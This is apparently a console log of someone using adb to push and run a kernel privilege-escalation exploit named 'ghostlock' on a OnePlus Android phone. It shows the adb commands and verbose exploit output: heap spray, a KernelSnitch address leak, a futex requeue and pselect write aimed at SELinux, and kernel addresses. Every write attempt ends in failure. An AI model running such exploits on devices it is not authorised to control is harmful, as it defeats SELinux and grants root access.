@@ -1,0 +1,287 @@
+Microsoft Windows [Version 10.0.19045.7807]
+(c) Microsoft Corporation. All rights reserved.
+
+D:\ANDROID USE\ADB\platform-tools>adb push "D:\ANDROID USE\ghostlock-oneplus-main\ghostlock-oneplus-main\ghostlock" /data/local/tmp/gl
+D:\ANDROID USE\ghostlock-oneplus-main\ghostlock-oneplus-ma...file pushed, 0 skipped. 27.5 MB/s (122296 bytes in 0.004s)
+
+D:\ANDROID USE\ADB\platform-tools>adb shell chmod +x /data/local/tmp/gl
+adb reboot
+D:\ANDROID USE\ADB\platform-tools>adb push "D:\ANDROID USE\ghostlock-oneplus-main\ghostlock-oneplus-main\ghostlock" /data/local/tmp/gl
+D:\ANDROID USE\ghostlock-oneplus-main\ghostlock-oneplus-ma...file pushed, 0 skipped. 35.5 MB/s (122296 bytes in 0.003s)
+
+D:\ANDROID USE\ADB\platform-tools>adb shell chmod +x /data/local/tmp/gl
+
+D:\ANDROID USE\ADB\platform-tools>adb reboot
+
+D:\ANDROID USE\ADB\platform-tools>adb shell "PSELECT_SHIFT=0 FOPS_MAX_ATTEMPTS=72 /data/local/tmp/gl"
+[*] kernel: 5.10.43
+[+] offsets matched: 5.10.43
+[*] init_cred image=ffffffc083cb3098 alias=ffffff802bcb3098
+[+] startup context pid=5106 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=5106 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=5106 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=5106 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=00000000a8000000 phys_offset=0000000080000000 delta=0000000028000000
+[*] [T+0ms] exploit start
+[*] [T+2442ms] pre-W1 drain
+[*] Write 1 attempt 1/5
+[*] === W1: SELinux === target=0xffffff802c07ab50 mode=1
+[*] [T+2442ms]   heap spray start
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 1/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 2/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 3/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 4/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 5/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff81b09a0000
+[*] prepare_kernel_page ok attempt=6
+[*] [T+29690ms]   heap spray done
+[*] main_route: firing CMP_REQUEUE_PI (waited 0 ms)
+[*] main_route: CMP_REQUEUE_PI ret=1 errno=0
+[*] pselect route setup attempt=1 simple=0 shift=0 page=ffffff81b09a0000 fake_lock=ffffff81b09a0000 fake_w0=ffffff81b09a0300 fake_task=ffffff81b09a0400 in0=0000000000000001 in3=ffffff802c07ab48 out0=ffffff802c07ab50 out1=ffffff81b09a0400 out2=ffffff81b09a0000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+30894ms]   PI route done
+[*] Write 1 attempt 2/5
+[*] === W1: SELinux === target=0xffffff802c07ab50 mode=1
+[*] [T+30994ms]   heap spray start
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 1/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 2/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 3/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff8197390408
+[*] prepare_kernel_page ok attempt=4
+[*] [T+49534ms]   heap spray done
+[*] main_route: firing CMP_REQUEUE_PI (waited 0 ms)
+[*] main_route: CMP_REQUEUE_PI ret=1 errno=0
+[*] pselect route setup attempt=1 simple=0 shift=0 page=ffffff8197390000 fake_lock=ffffff8197390000 fake_w0=ffffff8197390300 fake_task=ffffff8197390400 in0=0000000000000001 in3=ffffff802c07ab48 out0=ffffff802c07ab50 out1=ffffff8197390400 out2=ffffff8197390000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+50742ms]   PI route done
+[*] Write 1 attempt 3/5
+[*] === W1: SELinux === target=0xffffff802c07ab50 mode=1
+[*] [T+50842ms]   heap spray start
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 1/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 2/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 3/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 4/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 5/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 6/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 7/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 8/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 9/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 10/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 11/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 12/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 13/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 14/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 15/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff84646b70e0
+[*] prepare_kernel_page ok attempt=16
+[*] [T+130110ms]   heap spray done
+[*] main_route: firing CMP_REQUEUE_PI (waited 0 ms)
+[*] main_route: CMP_REQUEUE_PI ret=1 errno=0
+[*] pselect route setup attempt=1 simple=0 shift=0 page=ffffff84646b0000 fake_lock=ffffff84646b0000 fake_w0=ffffff84646b0300 fake_task=ffffff84646b0400 in0=0000000000000001 in3=ffffff802c07ab48 out0=ffffff802c07ab50 out1=ffffff84646b0400 out2=ffffff84646b0000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+131316ms]   PI route done
+[*] Write 1 attempt 4/5
+[*] === W1: SELinux === target=0xffffff802c07ab50 mode=1
+[*] [T+131417ms]   heap spray start
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 1/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 2/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 3/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 4/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff8bf310cc98
+[*] prepare_kernel_page ok attempt=5
+[*] [T+155567ms]   heap spray done
+[*] main_route: firing CMP_REQUEUE_PI (waited 0 ms)
+[*] main_route: CMP_REQUEUE_PI ret=1 errno=0
+[*] pselect route setup attempt=1 simple=0 shift=0 page=ffffff8bf3108000 fake_lock=ffffff8bf3108000 fake_w0=ffffff8bf3108300 fake_task=ffffff8bf3108400 in0=0000000000000001 in3=ffffff802c07ab48 out0=ffffff802c07ab50 out1=ffffff8bf3108400 out2=ffffff8bf3108000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+156771ms]   PI route done
+[*] Write 1 attempt 5/5
+[*] === W1: SELinux === target=0xffffff802c07ab50 mode=1
+[*] [T+156871ms]   heap spray start
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[-] KernelSnitch mm_struct leak failed
+[-] prepare_kernel_page retry 1/72
+[*] KernelSnitch setup: cpus=6 mm_per_slab=31 prep=992 spray=186 pre=30 post=31
+[*] KernelSnitch parameters: threads=6 collisions=4 futexes=49152 identity_step=0x200000000
+[*] KernelSnitch collisions: found
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff8747e33c78
+[*] prepare_kernel_page ok attempt=2
+[*] [T+170647ms]   heap spray done
+[*] main_route: firing CMP_REQUEUE_PI (waited 0 ms)
+[*] main_route: CMP_REQUEUE_PI ret=1 errno=0
+[*] pselect route setup attempt=1 simple=0 shift=0 page=ffffff8747e30000 fake_lock=ffffff8747e30000 fake_w0=ffffff8747e30300 fake_task=ffffff8747e30400 in0=0000000000000001 in3=ffffff802c07ab48 out0=ffffff802c07ab50 out1=ffffff8747e30400 out2=ffffff8747e30000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +201ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] pselect route done calls=1 success=1 step=0 errno=0
+[*] [T+171851ms]   PI route done
+[!] Write 1 failed
+
+D:\ANDROID USE\ADB\platform-tools>
